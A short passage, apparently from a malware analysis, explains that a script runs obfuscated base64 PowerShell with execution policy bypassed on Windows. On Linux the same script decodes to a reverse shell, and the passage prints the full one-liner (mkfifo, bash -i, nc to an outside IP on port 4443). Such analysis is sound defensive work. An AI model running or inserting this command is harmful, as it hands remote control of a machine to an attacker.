On Windows, it runs a heavily obfuscated PowerShell command encoded in base64 that is decoded and executed with bypassed execution policy, which is a common technique used to evade detection and run potentially harmful scripts. On Linux, it decodes a base64 string that contains shell commands to remove files and execute a bash shell script. Specifically, the Linux command decodes to: 'nohup rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 84.77.69.69 4443 >/tmp/f &', which sets up a reverse shell connecting to a remote IP address on port 4443. This behavior is characteristic of malware or unauthorized remote access tools, indicating malicious intent."
